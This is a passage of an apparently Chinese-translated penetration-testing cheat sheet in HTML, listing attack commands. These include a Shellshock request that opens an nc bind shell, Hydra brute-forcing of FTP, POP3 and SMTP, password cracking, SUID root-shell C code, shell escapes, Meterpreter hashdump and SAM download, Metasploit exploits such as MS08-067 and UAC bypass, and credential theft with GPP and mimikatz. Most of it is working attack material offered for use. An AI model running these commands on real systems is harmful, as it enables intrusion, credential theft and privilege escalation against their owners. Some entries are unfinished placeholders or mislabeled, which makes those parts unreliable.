+<h5 id="Shell-Shock-运行bind-shell"><a href="#Shell-Shock-运行bind-shell" class="headerlink" title="Shell Shock 运行bind shell"></a>Shell Shock 运行bind shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD &#x2F;cgi-bin&#x2F;status HTTP&#x2F;1.1\r\nUser-Agent: () &#123; :;&#125;; &#x2F;usr&#x2F;bin&#x2F;nc -l -p 9999 -e &#x2F;bin&#x2F;sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure>
+
+<h5 id="Shell-Shock-反弹shell"><a href="#Shell-Shock-反弹shell" class="headerlink" title="Shell Shock 反弹shell"></a>Shell Shock 反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 443</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单的本地Web服务器"><a href="#简单的本地Web服务器" class="headerlink" title="简单的本地Web服务器"></a>简单的本地Web服务器</h2><p>使用Python命令运行本地Web服务，在接受反向shell和攻击目标机器是很方便。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>python -m SimpleHTTPServer 80</code></td>
+<td>运行一个基本的 http 服务,接受反弹shell等情况下很棒</td>
+</tr>
+<tr>
+<td><code>python3 -m http.server</code></td>
+<td>运行一个基本的 Python3 http 服务</td>
+</tr>
+<tr>
+<td><code>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</code></td>
+<td>运行一个基本的ruby http 服务</td>
+</tr>
+<tr>
+<td><code>php -S 0.0.0.0:80</code></td>
+<td>运行一个基本的 PHP http 服务</td>
+</tr>
+</tbody></table>
+<h2 id="挂载文件共享"><a href="#挂载文件共享" class="headerlink" title="挂载文件共享"></a>挂载文件共享</h2><p>怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></td>
+<td>挂载NFS共享到 <code>/mnt/nfs</code></td>
+</tr>
+<tr>
+<td><code>mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs</code></td>
+<td>挂载Windows CIFS / SMB 共享到 Linux 的 <code>/mnt/cifs</code> 。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码</td>
+</tr>
+<tr>
+<td><code>net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no</code></td>
+<td>使用命令行在Windows间挂载共享文件</td>
+</tr>
+<tr>
+<td><code>apt-get install smb4k -y</code></td>
+<td>在Kali上安装smb4k，方便从Linux的GUI查看SMB共享</td>
+</tr>
+</tbody></table>
+<h2 id="HTTP-HTTPS-Web服务枚举"><a href="#HTTP-HTTPS-Web服务枚举" class="headerlink" title="HTTP / HTTPS Web服务枚举"></a>HTTP / HTTPS Web服务枚举</h2><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nikto -h 192.168.1.1</code></td>
+<td>对目标使用 nikto 进行扫描</td>
+</tr>
+<tr>
+<td><code>dirbuster</code></td>
+<td>使用GUI配置，命令行不好使</td>
+</tr>
+</tbody></table>
+<h2 id="数据包侦测"><a href="#数据包侦测" class="headerlink" title="数据包侦测"></a>数据包侦测</h2><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></td>
+<td>将网卡eth0的80端口的流量导出到output.pcap</td>
+</tr>
+</tbody></table>
+<h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>一些用来枚举目标系统用户名的手法。</p>
+<h3 id="SMB-用户枚举"><a href="#SMB-用户枚举" class="headerlink" title="SMB 用户枚举"></a>SMB 用户枚举</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</code></td>
+<td>枚举SMB用户</td>
+</tr>
+<tr>
+<td><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></td>
+<td>利用RID cycle枚举SMB用户</td>
+</tr>
+</tbody></table>
+<h3 id="SNMP-用户枚举"><a href="#SNMP-用户枚举" class="headerlink" title="SNMP 用户枚举"></a>SNMP 用户枚举</h3><table>
+<thead>
+<tr>
+<th>COMMAND</th>
+<th>DESCRIPTION</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>`snmpwalk public -v1 192.168.X.XXX 1</td>
+<td>grep 77.1.2.25</td>
+</tr>
+<tr>
+<td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX</code></td>
+<td>枚举 SNMP 用户</td>
+</tr>
+<tr>
+<td><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)</code></td>
+<td>使用nmap搜索SNMP服务器，然后用grep过滤输出</td>
+</tr>
+</tbody></table>
+<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/usr/share/wordlists</code></td>
+<td>Kali 的字典存放路径</td>
+</tr>
+</tbody></table>
+<h2 id="爆破服务"><a href="#爆破服务" class="headerlink" title="爆破服务"></a>爆破服务</h2><h3 id="使用Hydra-爆破FTP"><a href="#使用Hydra-爆破FTP" class="headerlink" title="使用Hydra 爆破FTP"></a>使用Hydra 爆破FTP</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V</code></td>
+<td>使用Hydra 爆破FTP</td>
+</tr>
+</tbody></table>
+<h3 id="使用Hydra-爆破POP3"><a href="#使用Hydra-爆破POP3" class="headerlink" title="使用Hydra 爆破POP3"></a>使用Hydra 爆破POP3</h3><table>
+<thead>
+<tr>
+<th>COMMAND</th>
+<th>DESCRIPTION</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V</code></td>
+<td>使用Hydra 爆破POP3</td>
+</tr>
+</tbody></table>
+<h3 id="使用Hydra-爆破SMTP"><a href="#使用Hydra-爆破SMTP" class="headerlink" title="使用Hydra 爆破SMTP"></a>使用Hydra 爆破SMTP</h3><table>
+<thead>
+<tr>
+<th>COMMAND</th>
+<th>DESCRIPTION</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></td>
+<td>使用Hydra 爆破SMTP</td>
+</tr>
+</tbody></table>
+<p>使用 <code>-t</code> 限制并发连接数，如 <code>-t 15</code></p>
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>渗透测试中用于密码破解的工具。</p>
+<h3 id="John-The-Ripper-JTR"><a href="#John-The-Ripper-JTR" class="headerlink" title="John The Ripper - JTR"></a>John The Ripper - JTR</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></td>
+<td>JTR 破解密码</td>
+</tr>
+<tr>
+<td><code>john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt</code></td>
+<td>JTR 使用字典爆破解密</td>
+</tr>
+<tr>
+<td><code>john --format=descrypt hash --show</code></td>
+<td>JTR 爆破解密</td>
+</tr>
+</tbody></table>
+<h2 id="Windows-渗透测试命令"><a href="#Windows-渗透测试命令" class="headerlink" title="Windows 渗透测试命令"></a>Windows 渗透测试命令</h2><p>See <strong>Windows Penetration Testing Commands</strong>.【待原文补充】</p>
+<h2 id="Linux-渗透测试命令"><a href="#Linux-渗透测试命令" class="headerlink" title="Linux 渗透测试命令"></a>Linux 渗透测试命令</h2><p>参考本站的<a target="_blank" rel="noopener" href="https://highon.coffee/blog/linux-commands-cheat-sheet/">Linux 命令速查表</a> ，该表提供了很多有用的命令。</p>
+<h2 id="编译EXP"><a href="#编译EXP" class="headerlink" title="编译EXP"></a>编译EXP</h2><p>Some notes on compiling exploits.【待原文补充】</p>
+<h3 id="判断C代码适用于Windows平台还是Linux"><a href="#判断C代码适用于Windows平台还是Linux" class="headerlink" title="判断C代码适用于Windows平台还是Linux"></a>判断C代码适用于Windows平台还是Linux</h3><p>通过<code>#include</code> 的文件来判定 </p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></td>
+<td>Windows平台代码</td>
+</tr>
+<tr>
+<td><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,  sys/sockt.h, sys/types.h, unistd.h</code></td>
+<td>Linux平台代码</td>
+</tr>
+</tbody></table>
+<h3 id="使用GCC编译Exploit"><a href="#使用GCC编译Exploit" class="headerlink" title="使用GCC编译Exploit"></a>使用GCC编译Exploit</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>gcc -o exploit exploit.c</code></td>
+<td>GCC基本用法</td>
+</tr>
+</tbody></table>
+<h3 id="在64位的Kali上用GCC编译32位的EXP"><a href="#在64位的Kali上用GCC编译32位的EXP" class="headerlink" title="在64位的Kali上用GCC编译32位的EXP"></a>在64位的Kali上用GCC编译32位的EXP</h3><p>很方便地在64位的攻击机器上交叉编译32位的二进制文件。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>gcc -m32 exploit.c -o exploit</code></td>
+<td>在64位的Linux上交叉编译32位的二进制文件</td>
+</tr>
+</tbody></table>
+<h3 id="在-Linux上编译可运行于Windows的exe文件"><a href="#在-Linux上编译可运行于Windows的exe文件" class="headerlink" title="在 Linux上编译可运行于Windows的exe文件"></a>在 Linux上编译可运行于Windows的exe文件</h3><table>
+<thead>
+<tr>
+<th>COMMAND</th>
+<th>DESCRIPTION</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></td>
+<td>在 Linux上生成Windows的exe</td>
+</tr>
+</tbody></table>
+<h2 id="SUID-二进制"><a href="#SUID-二进制" class="headerlink" title="SUID 二进制"></a>SUID 二进制</h2><p>通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。</p>
+<p>下面是一些可用的shell：</p>
+<h3 id="运行-bin-bash的SUID-C-Shell"><a href="#运行-bin-bash的SUID-C-Shell" class="headerlink" title="运行 /bin/bash的SUID C Shell"></a>运行 /bin/bash的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;       </span><br></pre></td></tr></table></figure>
+
+<h3 id="运行-bin-sh的SUID-C-Shell"><a href="#运行-bin-sh的SUID-C-Shell" class="headerlink" title="运行 /bin/sh的SUID C Shell"></a>运行 /bin/sh的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;       </span><br></pre></td></tr></table></figure>
+
+<h3 id="构建-SUID-Shell-二进制"><a href="#构建-SUID-Shell-二进制" class="headerlink" title="构建 SUID Shell 二进制"></a>构建 SUID Shell 二进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o suid suid.c  </span><br></pre></td></tr></table></figure>
+
+<p>32位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o suid suid.c  </span><br></pre></td></tr></table></figure>
+
+<h2 id="反向Shells"><a href="#反向Shells" class="headerlink" title="反向Shells"></a>反向Shells</h2><p>参考 <a target="_blank" rel="noopener" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">反向 Shell 速查表</a> 。</p>
+<h2 id="TTY-Shells"><a href="#TTY-Shells" class="headerlink" title="TTY Shells"></a>TTY Shells</h2><p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p>
+<p>一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 <code>su</code> 的特殊命令。</p>
+<h3 id="用Python模拟-TTY-Shell的技巧"><a href="#用Python模拟-TTY-Shell的技巧" class="headerlink" title="用Python模拟 TTY Shell的技巧"></a>用Python模拟 TTY Shell的技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="用sh模拟交互式shell"><a href="#用sh模拟交互式shell" class="headerlink" title="用sh模拟交互式shell"></a>用sh模拟交互式shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin&#x2F;sh -i</span><br></pre></td></tr></table></figure>
+
+<h3 id="用Perl模拟-TTY-Shell"><a href="#用Perl模拟-TTY-Shell" class="headerlink" title="用Perl模拟 TTY Shell"></a>用Perl模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;&#x2F;bin&#x2F;sh&quot;;</span><br><span class="line">perl —e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="用Ruby模拟-TTY-Shell"><a href="#用Ruby模拟-TTY-Shell" class="headerlink" title="用Ruby模拟 TTY Shell"></a>用Ruby模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="用Lua-模拟TTY-Shell"><a href="#用Lua-模拟TTY-Shell" class="headerlink" title="用Lua 模拟TTY Shell"></a>用Lua 模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="从Vi模拟TTY-Shell"><a href="#从Vi模拟TTY-Shell" class="headerlink" title="从Vi模拟TTY Shell"></a>从Vi模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="用NMAP模拟TTY-Shell"><a href="#用NMAP模拟TTY-Shell" class="headerlink" title="用NMAP模拟TTY Shell"></a>用NMAP模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="Metasploit-速查表"><a href="#Metasploit-速查表" class="headerlink" title="Metasploit 速查表"></a>Metasploit 速查表</h2><p>这是一个metasploit方便的速查手册。关于跳板技术可参看 <a target="_blank" rel="noopener" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/">Meterpreter Pivoting</a> 。</p>
+<h3 id="Meterpreter-Payloads"><a href="#Meterpreter-Payloads" class="headerlink" title="Meterpreter Payloads"></a>Meterpreter Payloads</h3><h3 id="Windows-反向meterpreter-payload"><a href="#Windows-反向meterpreter-payload" class="headerlink" title="Windows 反向meterpreter payload"></a>Windows 反向meterpreter payload</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>set payload windows/meterpreter/reverse_tcp</code></td>
+<td>Windows 反向tcp payload</td>
+</tr>
+</tbody></table>
+<h3 id="Windows-VNC-Meterpreter-payload"><a href="#Windows-VNC-Meterpreter-payload" class="headerlink" title="Windows VNC Meterpreter payload"></a>Windows VNC Meterpreter payload</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>set payload windows/vncinject/reverse_tcp``set ViewOnly false</code></td>
+<td>Meterpreter Windows VNC Payload</td>
+</tr>
+</tbody></table>
+<h3 id="Linux-反向Meterpreter-payload"><a href="#Linux-反向Meterpreter-payload" class="headerlink" title="Linux 反向Meterpreter payload"></a>Linux 反向Meterpreter payload</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>set payload linux/meterpreter/reverse_tcp</code></td>
+<td>Meterpreter Linux 反向Payload</td>
+</tr>
+</tbody></table>
+<h2 id="Meterpreter速查表"><a href="#Meterpreter速查表" class="headerlink" title="Meterpreter速查表"></a>Meterpreter速查表</h2><p>有用的meterpreter 命令。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>upload file c:\\windows</code></td>
+<td>Meterpreter上传文件到 Windows 目标</td>
+</tr>
+<tr>
+<td><code>download c:\\windows\\repair\\sam /tmp</code></td>
+<td>Meterpreter 从 Windows 目标下载文件</td>
+</tr>
+<tr>
+<td><code>execute -f c:\\windows\temp\exploit.exe</code></td>
+<td>Meterpreter 在目标机器上执行.exe文件——用来执行上传的exp很方便</td>
+</tr>
+<tr>
+<td><code>execute -f cmd -c </code></td>
+<td>创建新的cmd shell通道</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>Meterpreter显示进程</td>
+</tr>
+<tr>
+<td><code>shell</code></td>
+<td>Meterpreter获取目标shell</td>
+</tr>
+<tr>
+<td><code>getsystem</code></td>
+<td>Meterpreter尝试提权</td>
+</tr>
+<tr>
+<td><code>hashdump</code></td>
+<td>Meterpreter尝试导出目标机器上的哈希</td>
+</tr>
+<tr>
+<td><code>portfwd add –l 3389 –p 3389 –r target</code></td>
+<td>Meterpreter端口转发</td>
+</tr>
+<tr>
+<td><code>portfwd delete –l 3389 –p 3389 –r target</code></td>
+<td>Meterpreter删除端口转发</td>
+</tr>
+</tbody></table>
+<h2 id="常用Metasploit-模块"><a href="#常用Metasploit-模块" class="headerlink" title="常用Metasploit 模块"></a>常用Metasploit 模块</h2><p>最常用的metasploit 模块。</p>
+<h3 id="远程Windows-Metasploit-模块-exploits"><a href="#远程Windows-Metasploit-模块-exploits" class="headerlink" title="远程Windows Metasploit 模块(exploits)"></a>远程Windows Metasploit 模块(exploits)</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>use exploit/windows/smb/ms08_067_netapi</code></td>
+<td>MS08_067 Windows 2k, XP, 2003 远程攻击</td>
+</tr>
+<tr>
+<td><code>use exploit/windows/dcerpc/ms06_040_netapi</code></td>
+<td>MS08_040 Windows NT, 2k, XP, 2003 远程攻击</td>
+</tr>
+<tr>
+<td><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code></td>
+<td>MS09_050 Windows Vista SP1/SP2 和Server 2008 (x86) 远程攻击</td>
+</tr>
+</tbody></table>
+<h3 id="本地Windows-Metasploit-模块-exploits"><a href="#本地Windows-Metasploit-模块-exploits" class="headerlink" title="本地Windows Metasploit 模块(exploits)"></a>本地Windows Metasploit 模块(exploits)</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>use exploit/windows/local/bypassuac</code></td>
+<td>绕过 Windows 7 上的UAC</td>
+</tr>
+</tbody></table>
+<h3 id="辅助Metasploit-模块"><a href="#辅助Metasploit-模块" class="headerlink" title="辅助Metasploit 模块"></a>辅助Metasploit 模块</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>use auxiliary/scanner/http/dir_scanner</code></td>
+<td>Metasploit HTTP 目录扫描</td>
+</tr>
+<tr>
+<td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td>
+<td>Metasploit JBOSS 漏扫</td>
+</tr>
+<tr>
+<td><code>use auxiliary/scanner/mssql/mssql_login</code></td>
+<td>Metasploit MSSQL 认证扫描</td>
+</tr>
+<tr>
+<td><code>use auxiliary/scanner/mysql/mysql_version</code></td>
+<td>Metasploit MSSQL 版本扫描</td>
+</tr>
+<tr>
+<td><code>use auxiliary/scanner/oracle/oracle_login</code></td>
+<td>Metasploit Oracle 登陆模块</td>
+</tr>
+</tbody></table>
+<h3 id="Metasploit-Powershell-模块"><a href="#Metasploit-Powershell-模块" class="headerlink" title="Metasploit Powershell 模块"></a>Metasploit Powershell 模块</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>use exploit/multi/script/web_delivery</code></td>
+<td>Metasploit powershell payload c传送模块</td>
+</tr>
+<tr>
+<td><code>post/windows/manage/powershell/exec_powershell</code></td>
+<td>Metasploit通过会话上传和执行 powershell脚本</td>
+</tr>
+<tr>
+<td><code>use exploit/multi/http/jboss_maindeployer</code></td>
+<td>Metasploit JBOSS 部署</td>
+</tr>
+<tr>
+<td><code>use exploit/windows/mssql/mssql_payload</code></td>
+<td>Metasploit MSSQL payload</td>
+</tr>
+</tbody></table>
+<h3 id="Windows-后渗透Metasploit-模块"><a href="#Windows-后渗透Metasploit-模块" class="headerlink" title="Windows 后渗透Metasploit 模块"></a>Windows 后渗透Metasploit 模块</h3><p>Windows Metasploit 提权模块。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>run post/windows/gather/win_privs</code></td>
+<td>Metasploit 显示当前用户权限</td>
+</tr>
+<tr>
+<td><code>use post/windows/gather/credentials/gpp</code></td>
+<td>Metasploit 提取 GPP 保存的密码</td>
+</tr>
+<tr>
+<td><code>load mimikatz -&gt; wdigest</code></td>
+<td>Metasplit 加载 Mimikatz</td>
+</tr>
+<tr>
+<td><code>run post/windows/gather/local_admin_search_enum</code></td>
+<td>检查当前用户是否对域内其他机器有管理员权限</td>
+</tr>
+<tr>
+<td><code>run post/windows/gather/smart_hashdump</code></td>
+<td>自动化导出sam 文件，尝试提权等。</td>
+</tr>
+</tbody></table>
+<h2 id="ASCII表速查"><a href="#ASCII表速查" class="headerlink" title="ASCII表速查"></a>ASCII表速查</h2><p>对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）</p>
+<table>
+<thead>
+<tr>
+<th>ASCII</th>
+<th>字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>x00</code></td>
+<td>Null Byte 空字节</td>
+</tr>
+<tr>
+<td><code>x08</code></td>
+<td>BS  退格</td>
+</tr>
+<tr>
+<td><code>x09</code></td>
+<td>TAB 水平制表符</td>
+</tr>
+<tr>
+<td><code>x0a</code></td>
+<td>LF 换行</td>
+</tr>
+<tr>
+<td><code>x0d</code></td>
+<td>CR 回车</td>
+</tr>
+<tr>
+<td><code>x1b</code></td>
+<td>ESC</td>
+</tr>
+<tr>
+<td><code>x20</code></td>
+<td>SPC 空格</td>
+</tr>
+<tr>
+<td><code>x21</code></td>
+<td>!</td>
+</tr>
+<tr>
+<td><code>x22</code></td>
+<td>“</td>
+</tr>
+<tr>
+<td><code>x23</code></td>
+<td>#</td>
+</tr>
+<tr>
+<td><code>x24</code></td>
+<td>$</td>
+</tr>
+<tr>
+<td><code>x25</code></td>
+<td>%</td>
+</tr>
+<tr>
+<td><code>x26</code></td>
+<td>&amp;</td>
+</tr>
+<tr>
+<td><code>x27</code></td>
+<td>`</td>
+</tr>
+<tr>
+<td><code>x28</code></td>
+<td>(</td>
+</tr>
+<tr>
+<td><code>x29</code></td>
+<td>)</td>
+</tr>
+<tr>
+<td><code>x2a</code></td>
+<td>*</td>
+</tr>
+<tr>
+<td><code>x2b</code></td>
+<td>+</td>
+</tr>
+<tr>
+<td><code>x2c</code></td>
+<td>,</td>
+</tr>
+<tr>
+<td><code>x2d</code></td>
+<td>-</td>
+</tr>
+<tr>
+<td><code>x2e</code></td>
+<td>.</td>
+</tr>
+<tr>
+<td><code>x2f</code></td>
+<td>/</td>
+</tr>
+<tr>
+<td><code>x30</code></td>
+<td>0</td>
+</tr>
+<tr>
+<td><code>x31</code></td>
+<td>1</td>
+</tr>
+<tr>
+<td><code>x32</code></td>
+<td>2</td>
+</tr>
+<tr>
+<td><code>x33</code></td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>x34</code></td>
+<td>4</td>
+</tr>
+<tr>
+<td><code>x35</code></td>
+<td>5</td>
+</tr>
+<tr>
+<td><code>x36</code></td>
+<td>6</td>
+</tr>
+<tr>
+<td><code>x37</code></td>
+<td>7</td>
+</tr>
+<tr>
+<td><code>x38</code></td>
+<td>8</td>
+</tr>
+<tr>
+<td><code>x39</code></td>
+<td>9</td>
+</tr>
+<tr>
+<td><code>x3a</code></td>
+<td>:</td>
+</tr>
+<tr>
+<td><code>x3b</code></td>
+<td>;</td>
+</tr>
+<tr>
+<td><code>x3c</code></td>
+<td>&lt;</td>
+</tr>
+<tr>
+<td><code>x3d</code></td>
+<td>=</td>
+</tr>
+<tr>
+<td><code>x3e</code></td>
+<td>&gt;</td>
+</tr>
+<tr>
+<td><code>x3f</code></td>
+<td>?</td>
+</tr>
+<tr>
+<td><code>x40</code></td>
+<td>@</td>
+</tr>
+<tr>
+<td><code>x41</code></td>
+<td>A</td>
+</tr>
+<tr>
+<td><code>x42</code></td>
+<td>B</td>
+</tr>
+<tr>
+<td><code>x43</code></td>
+<td>C</td>
+</tr>
+<tr>
+<td><code>x44</code></td>
+<td>D</td>
+</tr>
+<tr>
+<td><code>x45</code></td>
+<td>E</td>
+</tr>
+<tr>
+<td><code>x46</code></td>
+<td>F</td>
+</tr>
+<tr>
+<td><code>x47</code></td>
+<td>G</td>
+</tr>
+<tr>
+<td><code>x48</code></td>
+<td>H</td>
+</tr>
+<tr>
+<td><code>x49</code></td>
+<td>I</td>
+</tr>
+<tr>
+<td><code>x4a</code></td>
+<td>J</td>
+</tr>
+<tr>
+<td><code>x4b</code></td>
+<td>K</td>
+</tr>
+<tr>
+<td><code>x4c</code></td>
+<td>L</td>
+</tr>
+<tr>
+<td><code>x4d</code></td>
+<td>M</td>
+</tr>
+<tr>
+<td><code>x4e</code></td>
+<td>N</td>
+</tr>
+<tr>
+<td><code>x4f</code></td>
+<td>O</td>
+</tr>
+<tr>
+<td><code>x50</code></td>
+<td>P</td>
+</tr>
+<tr>
+<td><code>x51</code></td>
+<td>Q</td>
+</tr>
+<tr>
+<td><code>x52</code></td>
+<td>R</td>
+</tr>
+<tr>
+<td><code>x53</code></td>
+<td>S</td>
+</tr>
+<tr>
+<td><code>x54</code></td>
+<td>T</td>
+</tr>
+<tr>
+<td><code>x55</code></td>
+<td>U</td>
+</tr>
+<tr>
+<td><code>x56</code></td>
+<td>V</td>
+</tr>
+<tr>
+<td><code>x57</code></td>
+<td>W</td>
+</tr>
+<tr>
+<td><code>x58</code></td>
+<td>X</td>
+</tr>
+<tr>
+<td><code>x59</code></td>
+<td>Y</td>
+</tr>
+<tr>
+<td><code>x5a</code></td>
+<td>Z</td>
+</tr>
+<tr>
+<td><code>x5b</code></td>
+<td>[</td>
+</tr>
+<tr>
+<td><code>x5c</code></td>
+<td>\</td>
+</tr>
+<tr>
+<td><code>x5d</code></td>
+<td>]</td>
+</tr>
+<tr>
+<td><code>x5e</code></td>
+<td>^</td>
+</tr>
+<tr>
+<td><code>x5f</code></td>
+<td>_</td>
+</tr>
+<tr>
+<td><code>x60</code></td>
+<td>`</td>
+</tr>
+<tr>
+<td><code>x61</code></td>
+<td>a</td>
+</tr>
+<tr>
+<td><code>x62</code></td>
+<td>b</td>
+</tr>
+<tr>
+<td><code>x63</code></td>
+<td>c</td>
+</tr>
+<tr>
+<td><code>x64</code></td>
+<td>d</td>
+</tr>
+<tr>
+<td><code>x65</code></td>
+<td>e</td>
+</tr>
+<tr>
+<td><code>x66</code></td>
+<td>f</td>
+</tr>
+<tr>
